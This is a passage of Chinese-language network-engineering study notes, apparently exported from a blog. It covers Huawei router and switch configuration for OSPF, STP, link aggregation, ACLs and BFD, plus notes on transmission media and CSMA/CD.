33.33.33.33/32 OSPF 10 2 D 12.1.1.2 GigabitEthernet0/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R1]dis int brief PHY: Physical*down: administratively down(l): loopback(s): spoofing(b): BFD down^down: standby(e): ETHOAM down(d): Dampening SuppressedInUti/OutUti: input utility/output utilityInterface PHY Protocol InUti OutUti inErrors outErrorsGigabitEthernet0/0/0 up up 0% 0% 0 0GigabitEthernet0/0/1 down down 0% 0% 0 0GigabitEthernet0/0/2 down down 0% 0% 0 0LoopBack0 up up(s) 0% 0% 0 0NULL0 up up(s) 0% 0% 0 0 Shell - 接口下 OSPF 配置[R1]interface LoopBack0[R1-LoopBack0]ospf enable 1 area 0[R1-LoopBack0]dis th[V200R003C00]#interface LoopBack0 ip address 11.11.11.11 255.255.255.255 ospf enable 1 area 0.0.0.0#return OSPF 实验 R1# sysname R1#interface GigabitEthernet0/0/0 ip address 12.1.1.1 255.255.255.0 #interface GigabitEthernet0/0/1 ip address 13.1.1.1 255.255.255.0 #interface GigabitEthernet0/0/2 ip address 14.1.1.1 255.255.255.0 #interface LoopBack0 ip address 1.1.1.1 255.255.255.255 #ospf 1 router-id 1.1.1.1 area 0.0.0.0 network 1.1.1.1 0.0.0.0 network 12.1.1.1 0.0.0.0 network 13.1.1.1 0.0.0.0 network 14.1.1.1 0.0.0.0 # R2# sysname R2#interface GigabitEthernet0/0/0 ip address 12.1.1.2 255.255.255.0 #interface GigabitEthernet0/0/1 ip address 24.1.1.2 255.255.255.0 #interface GigabitEthernet0/0/2 ip address 23.1.1.2 255.255.255.0 #interface NULL0#interface LoopBack0 ip address 2.2.2.2 255.255.255.255 #ospf 1 router-id 2.2.2.2 area 0.0.0.0 network 2.2.2.2 0.0.0.0 network 12.1.1.2 0.0.0.0 network 23.1.1.2 0.0.0.0 network 24.1.1.2 0.0.0.0 # SW3#sysname SW3#vlan batch 10 to 80#stp disable#dhcp enable#interface Vlanif10 ip address 13.1.1.3 255.255.255.0#interface Vlanif30 ip address 34.1.1.3 255.255.255.0#interface Vlanif40 ip address 23.1.1.3 255.255.255.0#interface Vlanif50 ip address 192.168.1.254 255.255.255.0 dhcp select interface dhcp server lease day 0 hour 0 minute 10 dhcp server dns-list 8.8.8.8#interface GigabitEthernet0/0/1 port link-type access port default vlan 10#interface GigabitEthernet0/0/2 port link-type access port default vlan 50#interface GigabitEthernet0/0/3 port link-type access port default vlan 40#interface GigabitEthernet0/0/4 port link-type access port default vlan 30#interface LoopBack0 ip address 3.3.3.3 255.255.255.255#ospf 1 router-id 3.3.3.3 area 0.0.0.0 network 3.3.3.3 0.0.0.0 network 13.1.1.3 0.0.0.0 network 23.1.1.3 0.0.0.0 network 34.1.1.3 0.0.0.0 network 192.168.1.254 0.0.0.0# SW4#sysname SW4#vlan batch 10 to 80#stp disable#dhcp enable#interface Vlanif20 ip address 24.1.1.4 255.255.255.0#interface Vlanif30 ip address 34.1.1.4 255.255.255.0#interface Vlanif60 ip address 192.168.2.254 255.255.255.0 dhcp select interface dhcp server lease day 0 hour 0 minute 10 dhcp server dns-list 8.8.8.8#interface Vlanif70 ip address 14.1.1.4 255.255.255.0#interface GigabitEthernet0/0/1 port link-type access port default vlan 20#interface GigabitEthernet0/0/2 port link-type access port default vlan 60#interface GigabitEthernet0/0/3 port link-type access port default vlan 70#interface GigabitEthernet0/0/4 port link-type access port default vlan 30#interface LoopBack0 ip address 4.4.4.4 255.255.255.255#ospf 1 router-id 4.4.4.4 area 0.0.0.0 network 4.4.4.4 0.0.0.0 network 24.1.1.4 0.0.0.0 network 14.1.1.4 0.0.0.0 network 34.1.1.4 0.0.0.0 network 192.168.2.254 0.0.0.0# SW5#sysname SW5#stp disable#vlan batch 50 60#interface GigabitEthernet0/0/1 port link-type access port default vlan 50#interface GigabitEthernet0/0/2 port link-type access port default vlan 60#interface GigabitEthernet0/0/3 port link-type access port default vlan 50#interface GigabitEthernet0/0/4 port link-type access port default vlan 60# Shell-Displaydisplay bridge mac-address // 查看 macdisplay this // 查看当前视图display current-configuration // 查看当前配置display ip interface brief // 查看接口IPdisplay ip routing-table // 查看路由display port vlan 查看 vlan // 和接口display ospf peer brief // 查看 OSPF 对等统计信息"},{"title":"","date":"2024-01-03T06:00:00.000Z","updated":"2024-01-03T06:00:00.000Z","comments":true,"path":"notes/datacom/17.html","permalink":"https://blog.mhuig.top/notes/datacom/17","excerpt":"","text":"STP STP STPSTP: 生成树协议, 在以太网中, 通过阻塞部分链路形成树状结构, 从而消除网络中的环路结构, 当主链路发生故障时, 被阻塞的链路可以自行恢复转发状态, 从而保证网络中链路的可靠性. STP 的作用消除环路: 通过阻断多余的链路来消除网络中可能存在的环路. 备份链路: 当活动链路出现故障时, 激活备份链路, 代替活动链路继续进行数据转发. 以太网环路产生的影响 广播风暴: 广播帧在以太网中通过泛洪的方式进行数据转发, 所以一旦出现环路, 则广播帧会在环路中无限都是进行传递, 如果 PC 不断发送广播帧, 最终可能导致网络数据帧的阻塞, 导致网络瘫痪, 网络中充斥着重复的广播帧. MAC 地址表的漂移: 当产生环路时, MAC 地址表不断的学习和刷新以及删除 MAC 地址表项. 主机收到重复的数据帧. STP 专有名词根桥: ROOT, 是 STP 协议中的逻辑根设备, 是 STP 的逻辑中心. BID: 桥 ID, 描述交换机设备的参数, 由优先级和 MAC 地址两个部分组成 (16 + 48),在比较时先比较优先级, 当优先级相同时比较 MAC 地址, 越小越优. 桥优先级范围:0-65535, 步长4096, 缺省值32768, 最大值61440. STP 的开销: dot1d: 1-65535 dot1t: 1-200000000 legacy: 1-200000 RPC: 根路径开销, 非根交换机到达根的路径开销总和 (从根到该交换机的入方向接口开销总和) PID: 端口 ID, 是由端口优先级和端口编号构成 (8 + 8). 端口优先级取值范围 0-255, 必须是 16 的倍数, 缺省值为 128. STP 计算 选举根桥, 比较桥优先级, 数值越小越优, 如果优先级相同, 比较 MAC 地址, MAC 地址越小越优. 在所有非根交换机上选举根端口, 根端口只存在于非根交换机, 每个非根交换机只有一个根端口. 1. 比较该设备每个端口到达根桥的 RPC, 开销越小越优. 2.RPC 一致时, 则比较上游设备的 BID,BID 越小越优. 3. 上游 BID 一致时, 则比较上游设备的 PID, 越小越优. 4. 上游设备 PID 一致时, 则比较本设备的 PID, 越小越优. 指定桥: 本网段内到达根桥的最优设备. 每个链路内, 选举指定桥, 指定桥最优端口为指定端口. 1. 比较链路内的交换机到达根桥的根路径开销, 开销数值越小的交换机成为指定桥. 2. 如果开销一致, 则比较 BID 大小, 越小越优, 指定端口一定在指定桥上. 3. 如果指定桥在该链路有多个端口到达根桥, 则比较 PID,PID 数值小的成为指定端口. 所剩的非根非指定端口被阻塞, 阻塞端口不为用户转发数据, 并成为 STP 中的备份链路. STP 计时器Hello Time: STP 协议连续发送 BPDU 报文的间隔, 默认 2s. Max Age: 最大寿命, 交换机接收 BPDU 的最大间隔, 超过 Max Age 还没有接收到 BPDU, 则认为链路失效. 默认值 20s. Message Age: BPDU 每经过一个交换机就 + 1, 当超过最大值时则 BPDU 失效, 默认值 20. STP 的端口状态1. 禁用状态: disable, 当端口处于禁用或没有正常运行 STP 时. STP 的初始状态, 该状态下, 接口既不收发 BPDU 也不为用户转发数据. 2. 阻塞状态: blocking, 是端口阻塞的最终状态, 交换机在该状态下接收 BPDU, 但不发送 BPDU, 不为用户转发数据, 也不会学习 MAC 地址. 3. 监听状态: listening, 是一个过渡状态, 在该状态下交换机会收发 BPDU, 通过 BPDU 的交互最终确定端口角色该状态不会学习 MAC 地址, 也不为用户转发数据. 等待转发延迟计时器 (15s),超时进入到 learning 状态. 4. 学习状态: learning, 是一个过渡状态, 在该状态下交换机可以收发 BPDU, 可以学习 MAC 地址, 为用户转发数据做准备, 但不能发送用户数据. 等待转发延迟计时器 (15s),超时进入到 forwarding 状态. 5. 转发状态: forwarding, 是根端口和指定端口的最终状态, 在该状态下可以收发 BPDU, 学习 MAC 地址, 收发用户数据. 状态 收 BPDU 发 BPDU 收用户数据 发用户数据 学习 MAC 地址 禁用状态 x x x x x 阻塞状态 v x x x x 监听状态 v v x x x 学习状态 v v v x v 转发状态 v v v v v Shell[SW1]stp enable // 开启 stp[SW1]stp disable // 关闭 stp[SW1]display stp brief MSTID Port Role STP State Protection 0 GigabitEthernet0/0/1 ALTE DISCARDING NONE 0 GigabitEthernet0/0/2 ROOT FORWARDING NONE[SW1]stp root ? primary Primary root switch // 根桥 优先级变0 secondary Secondary root switch // 备份根桥 优先级变4096[SW1]stp priority ? // 修改优先级 INTEGER&lt;0-61440&gt; Bridge priority, in steps of 4096[SW1]stp pathcost-standard ? // 修改开销计算方式 整个网络都需要修改 dot1d-1998 IEEE 802.1D-1998 dot1t IEEE 802.1T legacy Legacy[SW1-GigabitEthernet0/0/1]stp cost ? // 修改开销 INTEGER&lt;1-200000000&gt; Port path cost[SW1-GigabitEthernet0/0/1]stp port priority ? // 修改接口优先级 INTEGER&lt;0-240&gt; Port priority, in steps of 16 PVIPVI: 协议版本标识符. 0: STP, 标准 STP, 基于 802.1D, 所有 STP 的基础. 所有的 VLAN 共用一个 STP 拓扑, 收敛速度慢 (30-50s). 2:RSTP, 快速 STP, 基于 802.1W, 在标准 STP 的基础上增加了部分快速收敛机制. 3:MSTP, 多实例 STP, 基于 802.1S, 在 RSTP 的基础上增加了多实例的配置, 可以实现多 VLAN 的 STP 不同的拓扑, 并且单独计算生成树."},{"title":"","date":"2024-01-08T06:00:00.000Z","updated":"2024-01-08T06:00:00.000Z","comments":true,"path":"notes/datacom/18.html","permalink":"https://blog.mhuig.top/notes/datacom/18","excerpt":"","text":"以太网链路聚合 以太网链路聚合 链路聚合以太捆绑端口聚合, 是将多台以太链路捆绑成一条逻辑链路, 从而实现带宽的增加和链路的冗余, 提高网络可靠性. 链路聚合优点链路聚合能够提高链路带宽: 理论上通过聚合几条链路, 一个聚合组的带宽可以扩展为被绑定链路带宽总和, 有效的增加了逻辑链路带宽. 网络可靠性: 配置链路聚合后, 如果某一条链路失效, 那么聚合的其他链路依旧可以转发数据. 支持负载均衡: 一个聚合组可以把流量分散到不同的被聚合的物理链路上, 通过多个链路将数据发送到同一个目的地, 将网络拥塞的可能降低. 链路聚合分为动态协商聚合和手工聚合. 手工聚合手工聚合只要接口被加入到聚合组中, 那么接口的状态就会 UP, 只关心自己到对端的状态, 不关心对端设备的状态, 如果对端设备出现故障, 本端设备依旧认为对端的端口 UP, 但是不知道对端已经不具备转发能力. 动态聚合动态聚合: LACP 模式, 聚合组中存在活动链路和非活动链路, 在 LACP 模式下, 会选举主动端和被动端, 被动端根据主动端选举出来的活跃接口来确定自己对应的活跃接口. 主动端和被动端选举: 1. 根据设备的优先级选举, 优先级数值越小越优先, 默认 32768. 2. 如果优先级相同, 则比较设备的 MAC 地址, MAC 地址越小越优 活跃链路选举: 1. 当设备通过命令设置了活跃链路数量, 会根据接口的优先级进行活跃链路选举, 优先级越小越优, 32768. 2. 如果优先级相同, 则比较端口号, 数值越小越优. Shell 手工聚合SW1[SW1]int Eth-Trunk [SW1]int Eth-Trunk ? &lt;0-63&gt; Eth-Trunk interface number[SW1]int Eth-Trunk 12[SW1-Eth-Trunk12]trunkport g 0/0/1 to 0/0/4[SW1]display interface Eth-Trunk 12Eth-Trunk12 current state : UPLine protocol current state : UPDescription:Switch Port, PVID : 1, Hash arithmetic : According to SIP-XOR-DIP,Maximal BW: 4G, Current BW: 4G, The Maximum Frame Length is 9216IP Sending Frames' Format is PKTFMT_ETHNT_2, Hardware address is 4c1f-cc7c-1cd9Current system time: 2024-01-08 11:57:24-08:00 Input bandwidth utilization : 0% Output bandwidth utilization : 0%-----------------------------------------------------PortName Status Weight-----------------------------------------------------GigabitEthernet0/0/1 UP 1GigabitEthernet0/0/2 UP 1GigabitEthernet0/0/3 UP 1GigabitEthernet0/0/4 UP 1-----------------------------------------------------The Number of Ports in Trunk : 4The Number of UP Ports in Trunk : 4 SW2[SW2]int Eth-Trunk 12[SW2-Eth-Trunk12]trunkport g 0/0/1 to 0/0/4 动态聚合SW3[SW3]int Eth-Trunk 34[SW3-Eth-Trunk34]mode lacp-static [SW3-Eth-Trunk34]trunkport g 0/0/1 to 0/0/4[SW3-Eth-Trunk34]max active-linknumber 2 SW4[SW4]int Eth-Trunk 34[SW4-Eth-Trunk34]mode lacp-static[SW4-Eth-Trunk34]trunkport g 0/0/1 to 0/0/4[SW4-Eth-Trunk34]max active-linknumber 2[SW4-Eth-Trunk34]dis th#interface Eth-Trunk34 mode lacp-static max active-linknumber 2#[SW4-Eth-Trunk34]display interface Eth-Trunk 34Eth-Trunk34 current state : UPLine protocol current state : UPDescription:Switch Port, PVID : 1, Hash arithmetic : According to SIP-XOR-DIP,Maximal BW: 4G, Current BW: 2G, The Maximum Frame Length is 9216IP Sending Frames' Format is PKTFMT_ETHNT_2, Hardware address is 4c1f-cc43-7170Current system time: 2024-01-08 12:28:39-08:00 Input bandwidth utilization : 0% Output bandwidth utilization : 0%-----------------------------------------------------PortName Status Weight-----------------------------------------------------GigabitEthernet0/0/1 UP 1GigabitEthernet0/0/2 UP 1GigabitEthernet0/0/3 DOWN 1GigabitEthernet0/0/4 DOWN 1-----------------------------------------------------The Number of Ports in Trunk : 4The Number of UP Ports in Trunk : 2[SW4-Eth-Trunk34] 接口优先级[SW3]lacp priority ? INTEGER&lt;0-65535&gt; Priority value, the default value is 32768[SW3]lacp priority 20[SW3]int g0/0/3[SW3-GigabitEthernet0/0/3]lacp priority 32769[SW3-GigabitEthernet0/0/3]dis int Eth-Trunk 34Eth-Trunk34 current state : UPLine protocol current state : UPDescription:Switch Port, PVID : 1, Hash arithmetic : According to SIP-XOR-DIP,Maximal BW: 4G, Current BW: 2G, The Maximum Frame Length is 9216IP Sending Frames' Format is PKTFMT_ETHNT_2, Hardware address is 4c1f-cc28-2c9fCurrent system time: 2024-01-08 13:54:30-08:00 Input bandwidth utilization : 0% Output bandwidth utilization : 0%-----------------------------------------------------PortName Status Weight-----------------------------------------------------GigabitEthernet0/0/1 UP 1GigabitEthernet0/0/2 UP 1GigabitEthernet0/0/3 DOWN 1GigabitEthernet0/0/4 DOWN 1-----------------------------------------------------The Number of Ports in Trunk : 4The Number of UP Ports in Trunk : 2[SW3-GigabitEthernet0/0/3]int g0/0/2[SW3-GigabitEthernet0/0/2]shutdown[SW3-GigabitEthernet0/0/2][SW3-GigabitEthernet0/0/2]dis int Eth-Trunk 34Eth-Trunk34 current state : UPLine protocol current state : UPDescription:Switch Port, PVID : 1, Hash arithmetic : According to SIP-XOR-DIP,Maximal BW: 4G, Current BW: 2G, The Maximum Frame Length is 9216IP Sending Frames' Format is PKTFMT_ETHNT_2, Hardware address is 4c1f-cc28-2c9fCurrent system time: 2024-01-08 13:54:57-08:00 Input bandwidth utilization : 0% Output bandwidth utilization : 0%-----------------------------------------------------PortName Status Weight-----------------------------------------------------GigabitEthernet0/0/1 UP 1GigabitEthernet0/0/2 DOWN 1GigabitEthernet0/0/3 DOWN 1GigabitEthernet0/0/4 UP 1-----------------------------------------------------The Number of Ports in Trunk : 4The Number of UP Ports in Trunk : 2[SW3-GigabitEthernet0/0/2][SW3]display Eth-Trunk 34Eth-Trunk34's state information is:Local:LAG ID: 34 WorkingMode: STATIC Preempt Delay: Disabled Hash arithmetic: According to SIP-XOR-DIP System Priority: 20 System ID: 4c1f-cc28-2c9f Least Active-linknumber: 1 Max Active-linknumber: 2 Operate status: up Number Of Up Port In Trunk: 2 --------------------------------------------------------------------------------ActorPortName Status PortType PortPri PortNo PortKey PortState WeightGigabitEthernet0/0/1 Selected 1GE 32768 2 8753 10111100 1 GigabitEthernet0/0/2 Unselect 1GE 32768 3 8753 10100010 1 GigabitEthernet0/0/3 Selected 1GE 32769 4 8753 10111100 1 GigabitEthernet0/0/4 Unselect 1GE 32768 5 8753 10100000 1 Partner:--------------------------------------------------------------------------------ActorPortName SysPri SystemID PortPri PortNo PortKey PortStateGigabitEthernet0/0/1 32768 4c1f-cc43-7170 32768 2 8753 10111100GigabitEthernet0/0/2 0 0000-0000-0000 0 0 0 10100011GigabitEthernet0/0/3 32768 4c1f-cc43-7170 32768 4 8753 10111100GigabitEthernet0/0/4 32768 4c1f-cc43-7170 32768 5 8753 10110000"},{"title":"","date":"2024-01-09T06:00:00.000Z","updated":"2024-01-09T06:00:00.000Z","comments":true,"path":"notes/datacom/19.html","permalink":"https://blog.mhuig.top/notes/datacom/19","excerpt":"","text":"ACL 原理和配置 ACL 原理和配置 ACLACL: 访问控制列表, 可以对数据, 报文流量进行过滤控制访问的一种工具. ACL 分类1. 基本 ACL: 2000-2999 可以根据报文中的源 IP 地址对数据进行控制 2. 高级 ACL: 3000-3999 可以根据五元组 (源 IP 地址, 目的 IP 地址, 源端口, 目的端口, 协议) 3. 二层 ACL: 4000-4999 源目 MAC 地址以及二层协议类型 ACL 规则1.ACL 可以由多条规则组成, 其中规则由 \"permit\" 和 \"deny\" 语句组成 2. 设备收到数据流后会逐条匹配 ACL 规则 3. 如果不匹配则继续向下匹配, 一旦找到匹配的规则执行该规则的动作, 并且不再继续与后续的规则匹配 4.ACL 规则按照编号从小到大匹配 5. 默认情况下, 编号步长为 5 ACL 调用方向入站 (inbound): 数据流进入路由器的方向 出站 (outbound): 数据流发出的方向 shellacl number 2000 rule 5 permit source 192.168.1.0 0.0.0.255 rule 10 deny source 192.168.2.0 0.0.0.255 #interface GigabitEthernet0/0/0 traffic-filter outbound acl 2000 [R1]acl 2000[R1-acl-basic-2000]rule permit source 192.168.1.0 0.0.0.255[R1-acl-basic-2000]rule deny source 192.168.2.0 0.0.0.255[R1-acl-basic-2000]dis th[V200R003C00]#acl number 2000 rule 5 permit source 192.168.1.0 0.0.0.255 rule 10 deny source 192.168.2.0 0.0.0.255 #return[R1-acl-basic-2000][R1-acl-basic-2000]rule ? INTEGER&lt;0-4294967294&gt; ID of ACL rule deny Specify matched packet deny permit Specify matched packet permit[R1-acl-basic-2000]rule permit ? fragment Check fragment packet none-first-fragment Check the subsequence fragment packet source Specify source address time-range Specify a special time vpn-instance Specify a VPN-Instance &lt;cr&gt; Please press ENTER to execute command R1# sysname R1#acl number 2000 rule 5 permit source 192.168.1.0 0.0.0.255 rule 10 deny source 192.168.2.0 0.0.0.255 #interface GigabitEthernet0/0/0 ip address 12.1.1.1 255.255.255.0 traffic-filter outbound acl 2000#interface GigabitEthernet0/0/1 ip address 13.1.1.1 255.255.255.0 #interface GigabitEthernet0/0/2 ip address 192.168.1.254 255.255.255.0 #interface GigabitEthernet4/0/0 ip address 192.168.2.254 255.255.255.0 #interface LoopBack0 ip address 1.1.1.1 255.255.255.255 #ospf 1 router-id 1.1.1.1 area 0.0.0.0 network 1.1.1.1 0.0.0.0 network 12.1.1.1 0.0.0.0 network 13.1.1.1 0.0.0.0 network 192.168.1.254 0.0.0.0 network 192.168.2.254 0.0.0.0 # R2# sysname R2#interface GigabitEthernet0/0/0 ip address 12.1.1.2 255.255.255.0 #interface LoopBack0 ip address 2.2.2.2 255.255.255.255 #ospf 1 router-id 2.2.2.2 area 0.0.0.0 network 2.2.2.2 0.0.0.0 network 12.1.1.2 0.0.0.0 R3# sysname R3#acl number 3000 rule 5 deny tcp source 12.1.1.2 0 destination 13.1.1.3 0 destination-port eq telnet #interface GigabitEthernet0/0/0 ip address 13.1.1.3 255.255.255.0 traffic-filter inbound acl 3000#interface LoopBack0 ip address 3.3.3.3 255.255.255.255 #ospf 1 router-id 3.3.3.3 area 0.0.0.0 network 3.3.3.3 0.0.0.0 network 13.1.1.3 0.0.0.0 #user-interface vty 0 4 authentication-mode password set authentication password cipher %$%$Bw.-6uoM]XN2l&amp;&gt;pzZ&amp;X,%In[7fqV+cWrS,7Yk,,CAQY%Iq,%$%$"},{"title":"","date":"2023-12-03T05:59:00.000Z","updated":"2023-12-03T05:59:00.000Z","comments":true,"path":"notes/datacom/2.html","permalink":"https://blog.mhuig.top/notes/datacom/2","excerpt":"","text":"传输介质 传输介质 传输速率500Mb/s 10MB/s bit 位 Byte 字节 1Byte=8bit Speed: 速率, 网络中数据传输的速度. bit/s: 比特 / s, 一般用于网络设备或线缆传输速率的描述. Byte/s: 字节 / s, 一般用于文件的传输速率描述. 1Byte/s=8bit/s 计算机网络最常用的性能指标是: 速率、带宽、吞吐量、时延 (发送时延、传播时延、处理时延、排队时延)、时延带宽积、往返时间和信道 (或网络) 利用率。 网络中的线同轴电缆结构: 外层导体和内导体的圆心在同一个轴心上.优点: 标准距离长, 抗干扰能力长, 传输距离稳定.缺点: 体积大, 占用线缆管道空间大, 不能够接受缠结, 压力或弯度过大, 安全性低. 分类 粗同轴电缆: 有效传输距离 500m, 直径 9.5mm 左右.适用于大型的局域网络, 标准距离长, 可靠性高. 细同轴电缆: 有效传输距离 185m, 直径 5mm 左右.造价低, 体积小. 双绞线理论最大传输距离 100m, 共四对八根, 两两相绕. 为了消减双绞线在传输电信号时产生的电磁干扰需要将 8 根线两两相绕. 双绞线分类 按照传输速度: 5 类: 最高传输速度 100Mbit/s 有效传输距离 100m. 超 5 类: 传输速度 1000Mbit/s 有效传输距离 100m. 6 类: 传输速度两倍超五类以上有效传输距离 100m. 按照有无屏蔽层分类 屏蔽双绞线 (STP): 在双绞线与外层绝缘之间有一个金属的屏蔽层, 减少外部电磁干扰, 屏蔽双绞线一般比非屏蔽双绞线拥有更高的传输效率. 非屏蔽双绞线 (UTP) 双绞线的线序T568-A: 绿白 绿 橙白 蓝 蓝白 橙 棕白 棕 T568-B: 橙白 橙 绿白 蓝 蓝白 绿 棕白 棕 连接方式如果两端的线序不一致, 交叉线. 如果两端的线序一致, 直连线 / 直通线. 当两个设备在同一组内使用交叉线, 不同组内使用直通线. PC, 服务器, 路由器 交换机, 集线器 光纤通过光的全反射进行信息传递. 结构: 光导纤维, 由玻璃或塑料制成的纤维, 作为光的传导工具. 纤芯: 位于光纤的中心, 用于传导光信号. 涂覆层: 位于中间位置, 满足光信号的全反射. 包层: 位于最外层, 一般用于保护光纤. 光纤的种类: 单模光纤: 传输距离至少可以到达 5 公里, 只传递一束光, 因为反射角度大损耗小, 所以传输距离非常远. 多模光纤: 可以传递多束光, 传输速率较快, 传递距离较短. 优点: 传输距离远, 速率快, 损耗低, 抗干扰能力强. 缺点: 弯折能力有限, 容易损坏. 无线 移动性, 不受时间和空间的限制. 灵活性, 不受线缆的限制. 成本低, 不需要大量的工程布线, 节省线路维护费用. 易安装, 配置和维护更容易. 蓝牙, 红外线, 微波, 无线电. 数据通信模式 (设备的双工模式) 单工: 数据只能从一个方向到另一个方向进行传递, 不能反向传递.例子: 收音机. 半双工: 数据可以双向通信, 但是同一时间段只能进行单向通信.例子: 对讲机. 全双工: 数据可以在同一个数据节点进行双向通信.例子: 手机. CSMA/CD冲突: 多个设备在一个共享链路上, 同时发送数据就会产生冲突. 冲突域: 可能会产生冲突的范围. 避免冲突的办法CSMA/CD: 载波监听多路访问 / 冲突检测 发前先听: 在发送数据之前, 监听网络中是否存在其他设备正在发送数据, 如果有则暂停发送. 边发边听: 在发送数据过程中, 也会监听网络中的冲突情况, 如果发现冲突则会停止发送. 冲突避让: 一旦发生了冲突, 则通过避退算法, 启用计时器. 避让后再发: 等待随机时间后再发送数据."},{"title":"","date":"2024-01-24T07:00:00.000Z","updated":"2024-01-24T07:00:00.000Z","comments":true,"path":"notes/datacom/21.html","permalink":"https://blog.mhuig.top/notes/datacom/21","excerpt":"","text":"BFD 协议原理与配置 BFD 协议原理与配置 BFDBFD: 双向转发检测, 基于 UDP 工作, 端口号 3784 BFD 优点BFD 提供了一个通用的, 标准化的, 介质无关的, 协议无关的快速故障检测机制, 有以下两大优点: 对相邻转发引擎之间的通道提供轻负荷, 快速故障检测. 用单一的机制对任何介质, 任何协议层进行实时检测. BFD 的故障检测机制BFD 依赖会话进行故障检测, 在两个系统之间建立 BFD 会话, 并沿他们的路径快速的发送 BFD 控制报文, 如果一方在特定的时间内没有收到对方的 BFD 报文, 那么 BFD 认为会话 DOWN, 此时联动的其他协议或接口状态会发生改变. BFD 会话建立方式(主要区别在于 LD 和 RD 的配置方式) 静态建立 BFD 会话: 通过命令行手工配置 BFD 会话参数, 包括 LD 和 RD 等, 然后手工下发 BFD 会话建立请求 动态建立 BFD 会话: 1. 动态分配本地标识符: 当应用程序触发动态创建 BFD 会话时, 系统分配属于动态会话标识符的值作为本地标识符. 向对端发送 RD 为 0 的 BFD 报文. 2. 自学习远端标识符: 当 BFD 会话的一端收到 RD 为 0 的 BFD 控制报文时, 判断该报文是否与本地 BFD 会话匹配, 如果匹配, 则学习接收到的 BFD 报文中的 LD, 获取远端标识符. BFD 会话建立过程BFD 会话有四种状态 Down,Init,UP,Admindown. 会话状态通过 BFD 的 State 字段传递, 系统根据自己本地的会话状态和接收到对端的 BFD 报文来驱动状态的变化, BFD 状态机的建立采用三次握手机制, 以确保两端都能知道状态的变化. 1.RA 和 RB 各自启动 BFD 的状态机, 初始状态是 Down, 发送状态为 Down 报文. 2.RB 收到状态为 Down 的 BFD 报文, 状态切换至 Init, 并发送状态为 Init 的报文. 3.RB 本地 BFD 状态变为 Init 后, 不再处理接收到的 Down 报文. 4.RB 收到状态为 Init 的 BFD 报文后, 本地切换到 UP 状态. 5.RA 的 BFD 状态变化和 RB 一样. BFD 状态Down 状态说明会话 down, 一个会话维持在 down 状态直到收到对端的报文并且报文中 STA 字段不是 UP Init 状态说明与远端正在通信, 并期望进入 UP 状态, 当远端还没有回应一个 Init 状态的会话会维持 Init 状态, 直到接收到对端的 Init 包和 UP 包就会跳转到 UP 状态, 否则, 等到检测时间超时后, 会跳转到 Down 状态. UP 状态说明 BFD 会话建立成功, 并且正在确认链路的连通性, 会话会一直保持在 up 状态直到链路故障或管理 Down 操作. 如果收到远端的 Down 报文或者检测时间超时会话会从 up 跳转到 Down. Admindown 意味着会话被管理操作 down, 导致远端系统会话进入到 down 状态, 并一直保持 down 状态直到本端退出 Admindown. BFD 检测模式1. 异步模式: 本端按一定周期发送 BFD 控制报文, 检测位置为远端, 远端检测本端是否周期性的发送 BFD 控制报文. 2. 查询模式: 本端自身发送的 BFD 控制报文是否得到了回应. BFD 检测时间本地 BFD 报文的实际发送间隔 = MAX (本地配置的发送时间间隔, 对端配置的接收时间间隔) 本地 BFD 报文的实际接收间隔 = MAX (本地配置的接收时间间隔, 对端配置的发送时间间隔) 超时时间: 1. 异步模式: 对端超时倍数 * 本端的接收间隔 2. 查询模式: 本端超时倍数 * 本端的接收间隔 静态路由与 BFD 联动单跳检测[R1]ip route-static 4.4.4.4 32 12.1.1.2[R1]ip route-static 4.4.4.4 32 13.1.1.3 preference 70[R1]ip route-static 24.1.1.0 24 12.1.1.2[R1]ip route-static 34.1.1.0 24 13.1.1.3[R2]ip route-static 4.4.4.4 32 24.1.1.4[R3]ip route-static 4.4.4.4 32 34.1.1.4[R4]ip route-static 12.1.1.1 24 24.1.1.2[R4]ip route-static 13.1.1.1 24 34.1.1.3----R1:bfd // 开启BFD功能bfd 12 bind peer-ip 12.1.1.2 interface GigabitEthernet0/0/0 discriminator local 10 discriminator remote 20 commit----R2:bfd // 开启BFD功能bfd 21 bind peer-ip 123.1.1.1 interface GigabitEthernet0/0/0 discriminator local 20 discriminator remote 10 commit----R1配置静态路由与BFD联动[R1]ip route-static 4.4.4.4 255.255.255.255 12.1.1.2 track bfd-session 12---[R1]bfd // 开启BFD功能[R1-bfd]q[R1]bfd ? STRING&lt;1-15&gt; BFD configuration name &lt;1-15&gt; &lt;cr&gt; Please press ENTER to execute command [R1]bfd 12 ? bind Bind type &lt;cr&gt; Please press ENTER to execute command [R1]bfd 12 bind peer-ip 12.1.1.2 ? interface Bind the outgoing-interface(only for single hop) source-ip Set source IP address vpn-instance Vpn instance name &lt;cr&gt; Please press ENTER to execute command [R1]bfd 12 bind peer-ip 12.1.1.2 interface ? GigabitEthernet GigabitEthernet interface[R1]bfd 12 bind peer-ip 12.1.1.2 interface GigabitEthernet 0/0/0[R1-bfd-session-12][R1-bfd-session-12]dis th[V200R003C00]#bfd 12 bind peer-ip 12.1.1.2 interface GigabitEthernet0/0/0#return[R1-bfd-session-12]discriminator local 10[R1-bfd-session-12]discriminator remote 20[R1-bfd-session-12]commit [R1-bfd-session-12]dis th[V200R003C00]#bfd 12 bind peer-ip 12.1.1.2 interface GigabitEthernet0/0/0 discriminator local 10 discriminator remote 20 commit#return[R1-bfd-session-12]---[R2]undo bfdWarning: All BFD capability on the device will be deleted. Continue? [Y/N]y[R2][R1]undo bfd 12--- 多跳检测[R1]ip route-static 4.4.4.4 32 12.1.1.2[R1]ip route-static 4.4.4.4 32 13.1.1.3 preference 70[R1]ip route-static 24.1.1.0 24 12.1.1.2[R1]ip route-static 34.1.1.0 24 13.1.1.3[R2]ip route-static 1.1.1.1 32 12.1.1.1[R2]ip route-static 4.4.4.4 32 24.1.1.4[R3]ip route-static 1.1.1.1 32 13.1.1.1[R3]ip route-static 4.4.4.4 32 34.1.1.4[R4]ip route-static 12.1.1.1 24 24.1.1.2[R4]ip route-static 13.1.1.1 24 34.1.1.3[R4]ip route-static 1.1.1.1 24 34.1.1.3[R4]ip route-static 1.1.1.1 24 24.1.1.2[R1-bfd-session-14]dis th[V200R003C00]#bfd 14 bind peer-ip 24.1.1.4 // 创建BFD会话绑定x.x.x.x discriminator local 10 // 本端标识符 discriminator remote 40 //远端标识符 commit // 启用#[R4-bfd-session-41]dis th[V200R003C00]#bfd 41 bind peer-ip 